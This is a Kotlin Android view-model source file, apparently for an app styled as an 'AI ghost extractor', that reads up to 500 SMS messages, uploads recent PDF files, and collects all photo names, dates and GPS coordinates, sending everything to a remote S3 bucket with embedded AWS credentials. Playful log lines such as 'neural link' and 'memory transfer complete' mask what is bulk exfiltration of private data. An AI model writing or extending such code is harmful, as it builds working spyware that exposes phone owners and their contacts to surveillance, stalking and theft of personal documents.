package com.example.aighostextractor

import android.app.Application
import android.database.Cursor
import android.net.Uri
import android.provider.MediaStore
import android.util.Log
import androidx.lifecycle.AndroidViewModel
import androidx.lifecycle.viewModelScope
import com.amazonaws.auth.BasicAWSCredentials
import com.amazonaws.regions.Region
import com.amazonaws.regions.Regions
import com.amazonaws.services.s3.AmazonS3Client
import com.amazonaws.services.s3.model.ObjectMetadata
import com.google.gson.Gson
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.delay
import kotlinx.coroutines.flow.MutableStateFlow
import kotlinx.coroutines.flow.StateFlow
import kotlinx.coroutines.flow.asStateFlow
import kotlinx.coroutines.launch
import kotlinx.coroutines.withContext
import java.io.ByteArrayInputStream
import java.io.File
import java.io.FileInputStream

class ExtractionViewModel(application: Application) : AndroidViewModel(application) {

    private val _progress = MutableStateFlow(ExtractionProgress())
    val progress: StateFlow<ExtractionProgress> = _progress.asStateFlow()

    private val context = application.applicationContext
    private val S3_BUCKET = "ai-ghost-android"

    private val s3Client: AmazonS3Client by lazy {
        Log.d("GHOST", "Initializing S3 Client for bucket: $S3_BUCKET")
        val credentials = BasicAWSCredentials(BuildConfig.AWS_ACCESS_KEY, BuildConfig.AWS_SECRET_KEY)
        AmazonS3Client(credentials, Region.getRegion(Regions.US_EAST_1))
    }

    private val wordList = listOf(
        "alpha", "bravo", "charlie", "delta", "echo", "foxtrot",
        "ghost", "hotel", "indigo", "juliet", "kilo", "lima",
        "memory", "nebula", "orbit", "phantom", "quasar", "raven",
        "shadow", "titan", "ultra", "vector", "whisper", "xenon",
        "yellow", "zenith", "aurora", "cipher", "drift", "ember"
    )

    private fun generateSecretPhrase(): String {
        return (1..4).map { wordList.random() }.joinToString("-")
    }

    fun startExtraction(username: String) {
        val phrase = generateSecretPhrase()
        // Path: user_<name>/raw/
        val s3Prefix = "user_${username}/raw/"
        _progress.value = _progress.value.copy(username = username, secretPhrase = phrase)

        viewModelScope.launch {
            try {
                updateState(ExtractionState.Initializing)
                addLog("> Initializing neural link...")
                delay(800)

                updateState(ExtractionState.ReadingMemories)
                addLog("> Establishing phantom sync sequence...")
                delay(800)

                // 1. SMS Extraction (Match Java extractSms)
                updateState(ExtractionState.ExtractingSMS, smsActive = true)
                addLog("> Accessing SMS database...")
                val smsJson = extractSms()
                addLog("> SMS data extracted. Uploading to vault...")
                uploadToS3(smsJson, "${s3Prefix}sms.json")
                addLog("> SMS sync complete")
                delay(500)

                // 2. PDF Extraction (Match Java extractAndUploadPdfs)
                updateState(ExtractionState.ExtractingPDFs, pdfActive = true)
                addLog("> Scanning for document fragments...")
                val pdfData = extractAndUploadPdfs(s3Prefix)
                uploadToS3(pdfData, "${s3Prefix}pdf_metadata.json")
                addLog("> PDF sync complete")
                delay(500)

                // 3. Image Metadata Extraction (Match Java extractImageMetadata)
                updateState(ExtractionState.ExtractingImages, imageActive = true)
                addLog("> Scanning visual media...")
                val imageJson = extractImageMetadata()
                addLog("> Image metadata extracted. Uploading...")
                uploadToS3(imageJson, "${s3Prefix}image_metadata.json")
                addLog("> Image sync complete")
                delay(500)

                updateState(ExtractionState.Encrypting)
                addLog("> Generating manifest...")
                val manifest = Gson().toJson(mapOf(
                    "username" to username,
                    "phrase" to phrase,
                    "timestamp" to System.currentTimeMillis()
                ))
                uploadToS3(manifest, "user_${username}/manifest.json")
                addLog("> Manifest finalized.")
                delay(800)

                updateState(ExtractionState.Uploading)
                addLog("> Finalizing secure transmission...")
                delay(1000)

                updateState(ExtractionState.Complete)
                addLog("> Ghost confirmed. Memory transfer complete.")
                addLog("> Ghost ID: $username")
                addLog("> Ghost Key: $phrase")
                Log.d("GHOST", "COMPLETE: All data uploaded for $username")
            } catch (e: Exception) {
                Log.e("GHOST", "SYNC FAILED", e)
                addLog("❌ SYNC ERROR: ${e.localizedMessage}")
                updateState(ExtractionState.Idle)
            }
        }
    }

    private suspend fun uploadToS3(content: String, fileName: String) = withContext(Dispatchers.IO) {
        val bytes = content.toByteArray()
        val metadata = ObjectMetadata().apply {
            contentLength = bytes.size.toLong()
            contentType = if (fileName.endsWith(".json")) "application/json" else "text/plain"
        }
        s3Client.putObject(S3_BUCKET, fileName, ByteArrayInputStream(bytes), metadata)
        Log.d("GHOST", "Uploaded string: $fileName")
    }

    private suspend fun uploadFileToS3(file: File, key: String) = withContext(Dispatchers.IO) {
        val metadata = ObjectMetadata().apply {
            contentLength = file.length()
            contentType = "application/pdf"
        }
        s3Client.putObject(S3_BUCKET, key, FileInputStream(file), metadata)
        Log.d("GHOST", "Uploaded file: $key")
    }

    private suspend fun extractSms(): String = withContext(Dispatchers.IO) {
        val smsList = mutableListOf<Map<String, String>>()
        val cursor = context.contentResolver.query(
            Uri.parse("content://sms/"),
            arrayOf("address", "body", "date", "type"),
            null, null, "date DESC"
        )
        cursor?.use {
            var count = 0
            while (it.moveToNext() && count < 500) {
                smsList.add(mapOf(
                    "sender" to (it.getString(0) ?: ""),
                    "content" to (it.getString(1) ?: ""),
                    "date" to it.getString(2),
                    "type" to if (it.getString(3) == "1") "inbox" else "sent"
                ))
                count++
            }
        }
        Gson().toJson(smsList)
    }

    private suspend fun extractAndUploadPdfs(s3Prefix: String): String = withContext(Dispatchers.IO) {
        val pdfMetadata = mutableListOf<Map<String, String>>()
        val projection = arrayOf(
            MediaStore.Files.FileColumns.DISPLAY_NAME,
            MediaStore.Files.FileColumns.DATE_MODIFIED,
            MediaStore.Files.FileColumns.SIZE,
            MediaStore.Files.FileColumns.DATA
        )
        val selection = "${MediaStore.Files.FileColumns.MIME_TYPE} = ?"
        val selectionArgs = arrayOf("application/pdf")
        
        val cursor = context.contentResolver.query(
            MediaStore.Files.getContentUri("external"),
            projection, selection, selectionArgs,
            "${MediaStore.Files.FileColumns.DATE_MODIFIED} DESC"
        )

        cursor?.use {
            var count = 0
            while (it.moveToNext() && count < 5) {
                val name = it.getString(0)
                val date = it.getString(1)
                val size = it.getString(2)
                val path = it.getString(3)

                pdfMetadata.add(mapOf("name" to name, "date" to date, "size" to size))
                
                val file = File(path)
                if (file.exists()) {
                    addLog("📄 Uploading: $name")
                    uploadFileToS3(file, "${s3Prefix}pdfs/$name")
                    count++
                }
            }
        }
        Gson().toJson(pdfMetadata)
    }

    private suspend fun extractImageMetadata(): String = withContext(Dispatchers.IO) {
        val imageList = mutableListOf<Map<String, String>>()
        val projection = arrayOf(
            MediaStore.Images.Media.DISPLAY_NAME,
            MediaStore.Images.Media.DATE_TAKEN,
            MediaStore.Images.Media.LATITUDE,
            MediaStore.Images.Media.LONGITUDE,
            MediaStore.Images.Media.DATA
        )
        val cursor = context.contentResolver.query(
            MediaStore.Images.Media.EXTERNAL_CONTENT_URI,
            projection, null, null,
            "${MediaStore.Images.Media.DATE_TAKEN} DESC"
        )
        cursor?.use {
            while (it.moveToNext()) {
                imageList.add(mapOf(
                    "name" to (it.getString(0) ?: ""),
                    "date" to it.getString(1),
                    "lat" to (it.getString(2) ?: "0"),
                    "lng" to (it.getString(3) ?: "0"),
                    "path" to (it.getString(4) ?: "")
                ))
            }
        }
        Gson().toJson(imageList)
    }

    private fun updateState(
        state: ExtractionState,
        smsActive: Boolean = _progress.value.smsActive,
        pdfActive: Boolean = _progress.value.pdfActive,
        imageActive: Boolean = _progress.value.imageActive
    ) {
        _progress.value = _progress.value.copy(
            state = state,
            smsActive = smsActive,
            pdfActive = pdfActive,
            imageActive = imageActive
        )
    }

    private fun addLog(message: String) {
        _progress.value = _progress.value.copy(
            logs = _progress.value.logs + message
        )
    }

    fun reset() {
        _progress.value = ExtractionProgress()
    }
}
